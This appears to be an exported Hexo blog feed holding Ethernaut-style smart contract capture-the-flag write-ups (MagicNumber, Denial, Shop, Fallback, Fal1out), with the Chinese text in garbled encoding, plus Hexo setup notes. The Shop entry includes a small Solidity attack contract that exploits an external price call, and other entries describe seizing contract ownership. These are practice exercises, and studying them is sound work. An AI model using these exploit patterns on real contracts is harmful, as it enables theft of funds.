class="headerlink" title="MagicNunmber"></a>MagicNunmber</h2><p>è¦æ±‚æ˜¯,è°ƒç”¨whatIsTheMeaningOfLife()å‡½æ•°,å¹¶ä¸”è¿”å›æ•°å­—42,ä½†æ˜¯æ”»å‡»åˆçº¦ä¸èƒ½è¶…è¿‡10ä¸ªåˆçº¦</p><p>åˆ†æ:å¦‚æœç›´æ¥è°ƒç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">   function whatIsTheMeaningOfLife() external pure returns (uint)&#123;</span><br><span class="line">    return 42;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåˆçº¦å°†è¶…è¿‡10ä¸ªåˆçº¦ç ,ä¸ç¬¦åˆè¦æ±‚,è¿™æ—¶å°±ä½¿ç”¨æ±‡ç¼–ç¼–å†™ä¸€ä¸ªæ™ºèƒ½åˆçº¦,ç„¶åæ‰‹åŠ¨éƒ¨ç½²ä»£ç (æœ¬äººè¿˜åœ¨å­¦ä¹ æ±‡ç¼–è¯­è¨€)</p><hr><h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><p>è¦æ±‚æ˜¯,åœ¨æ‰€æœ‰è€…åœ¨è°ƒç”¨withdrawå‡½æ•°æ—¶æ‹’ç»å…¶æå–èµ„é‡‘</p><p>åˆ†æ:è¿™é¢˜å¤§æ¦‚æ€è·¯å¾ˆå¥½æ‡‚,å°±æ˜¯å¦‚ä½•å»å®ç°æ‹’ç»è½¬è´¦è¿™æ­¥è¦æ€è€ƒä¸€ä¸‹,åˆæ˜¯è¦ç”¨åˆ°æ±‡ç¼–è¯­è¨€,ç­‰æˆ‘å­¦ä¹ åå†æ¥è¡¥é¢˜è§£</p><hr><h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><p>è¦æ±‚æ˜¯ï¼Œä»¥ä½äºè¦ä»·çš„ä»·æ ¼ä»å•†åº—è´­ä¹°ç‰©å“</p><p>åˆ†æï¼šå°±æ˜¯ä½¿çŠ¶æ€å˜é‡isSoldç­‰äºtrueï¼Œè€Œä¸”è¿˜è¦ä½¿ä»·æ ¼ä½äº100ï¼Œç›®æ ‡åˆçº¦å·²ç»ç»™äº†ä¸€ä¸ªæ¥å£ï¼Œå°±æ˜¯å°±æ˜¯åœ¨è°ƒç”¨è¿™ä¸ªæ¥å£çš„æ—¶å€™æ»¡è¶³è¦æ±‚ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨çš„æ—¶å€™ï¼Œè¦ä½¿ä»·æ ¼é«˜äº100ï¼Œæ»¡è¶³ifçš„æ¡ä»¶ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨çš„æ—¶å€™priceå°±è®¾ç½®ä½äº100çš„ä»·æ ¼å³å¯</p><p>æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">  Shop private immutable target;</span><br><span class="line"></span><br><span class="line">   constructor (address _target)&#123;</span><br><span class="line">    target = Shop(_target);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   function pwn() external &#123;</span><br><span class="line">    target.buy();</span><br><span class="line">   &#125;</span><br><span class="line">   function price() external view returns (uint256)&#123;</span><br><span class="line">    //åˆ©ç”¨ç¬¬ä¸€æ¬¡è¿”å›isSoldä¸ºtureæ¥åŒºåˆ†ç¬¬å‡ æ¬¡è°ƒç”¨</span><br><span class="line">    if(isSold)</span><br><span class="line">      return 99;</span><br><span class="line">    else</span><br><span class="line">      return 100;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> é¢˜è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¶åœºé¢˜è§£</title>
      <link href="/2024/08/01/%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/01/%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>è¦æ±‚æ˜¯ï¼Œæˆä¸ºè¿™ä¸ªåˆçº¦çš„æ‰€æœ‰è€…ï¼Œå¹¶ä½¿è¿™ä¸ªåˆçº¦çš„é’±ä¸ºé›¶</p><p>é¦–å…ˆæ‰¾åˆ°ownerï¼Œ</p><p>åˆ†æ;<br>ä»è¿™ä¸ªåˆçº¦ä¸­å¯ä»¥çœ‹åˆ°ï¼Œè¦æˆä¸ºowner<br>1ï¼Œæˆ‘ä»¬çš„é’±å¿…é¡»å¤§äºåˆçº¦æŒæœ‰è€…çš„é’±ï¼Œä½†æ˜¯æœ€å¼€å§‹åˆçº¦æœ¬èº«å°±æœ‰1000etherï¼Œ<br>è¿™ä¸ªæ—¶å€™å°±èµ°contributeå‡½æ•°ä¸è¡Œï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰é‚£ä¹ˆå¤šé’±<br>2ï¼Œæ­¤æ—¶å‘ç°receiveï¼Œåªè¦æˆ‘ä»¬çš„é’±å’Œåˆçº¦çš„é’±å¤§äº0ï¼Œå°±å¯ä»¥æˆä¸ºè¿™ä¸ªåˆçº¦çš„æŒæœ‰è€…</p><p>æ–¹æ³•ï¼š<br>1ï¼Œåœ¨remixä¸Šéƒ¨ç½²è¿™ä¸ªåˆçº¦ï¼Œé¦–å…ˆè°ƒç”¨contributeå‡½æ•°ï¼Œç»™æˆ‘ä»¬è½¬è´¦ï¼›<br>2ï¼Œåœ¨è°ƒç”¨receiveå‡½æ•°ï¼Œå°±å®Œæˆäº†</p><h2 id="Fal1out"><a href="#Fal1out" class="headerlink" title="Fal1out"></a>Fal1out</h2><p>è¦æ±‚æ˜¯ï¼Œæˆä¸ºè¿™ä¸ªåˆçº¦çš„æ‰€æœ‰è€…</p><p>ä»è¿™ä¸ªé¢˜ç›®æ¥çœ‹ï¼ŒFallout,Fal1out,</p><p>åˆ†æï¼š<br>é¦–å…ˆçœ‹ä¸ownerç›¸å…³çš„å‡½æ•°ï¼Œå†å»åˆ†ææ„é€ çš„åˆçº¦åå­—Falloutï¼Œä»”ç»†å‘ç°æœ‰ä¸ªFal1outçš„å‡½æ•°ï¼Œå®ƒå®é™…ä¸Šæ˜¯å‘½åé”™è¯¯çš„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥è°ƒåŠ¨è¿™ä¸ªå‡½æ•°ï¼Œåˆšå¥½æˆä¸ºåˆçº¦çš„æ‰€æœ‰è€…</p><p>æ–¹æ³•ï¼š</p><p>å®šä¹‰å‡½æ•°æ¥å£ï¼Œç›´æ¥è°ƒç”¨è¯¥å‡½æ•°Fal1out,æ­¤æ—¶å°±æˆä¸ºäº†åˆçº¦çš„æ‰€æœ‰è€…</p>]]></content>
      
      
      
        <tags>
            
            <tag> é¢˜è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>my fist blog</title>
      <link href="/2024/08/01/my-fist-blog/"/>
      <url>/2024/08/01/my-fist-blog/</url>
      
        <content type="html"><![CDATA[<h2 id="å…ˆè¿›å…¥blog-cd-blog"><a href="#å…ˆè¿›å…¥blog-cd-blog" class="headerlink" title="å…ˆè¿›å…¥blog         cd blog"></a>å…ˆè¿›å…¥blog         cd blog</h2><h2 id="é¢„è§ˆhexo-hexo-s"><a href="#é¢„è§ˆhexo-hexo-s" class="headerlink" title="é¢„è§ˆhexo             hexo s"></a>é¢„è§ˆhexo             hexo s</h2><h2 id="åˆ›å»ºæ–‡ç« é¢˜ç›®-hexo-new-â€œâ€"><a href="#åˆ›å»ºæ–‡ç« é¢˜ç›®-hexo-new-â€œâ€" class="headerlink" title="åˆ›å»ºæ–‡ç« é¢˜ç›®        hexo new â€œâ€"></a>åˆ›å»ºæ–‡ç« é¢˜ç›®        hexo new â€œâ€</h2><h2 id="è¿›å…¥æ–‡ç« ç›®å½•-cd-æç›®å‰ï¼Œblogåçš„ä¸œè¥¿ï¼‰é¢˜ç›®-md"><a href="#è¿›å…¥æ–‡ç« ç›®å½•-cd-æç›®å‰ï¼Œblogåçš„ä¸œè¥¿ï¼‰é¢˜ç›®-md" class="headerlink" title="è¿›å…¥æ–‡ç« ç›®å½•        cd   æç›®å‰ï¼Œblogåçš„ä¸œè¥¿ï¼‰é¢˜ç›®.md"></a>è¿›å…¥æ–‡ç« ç›®å½•        cd   æç›®å‰ï¼Œblogåçš„ä¸œè¥¿ï¼‰é¢˜ç›®.md</h2><h2 id="å†™æ–‡ç« -notepad-é¢˜ç›®-md"><a href="#å†™æ–‡ç« -notepad-é¢˜ç›®-md" class="headerlink" title="å†™æ–‡ç«                   notepad é¢˜ç›®.md"></a>å†™æ–‡ç«                   notepad é¢˜ç›®.md</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/01/hello-world/"/>
      <url>/2024/08/01/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
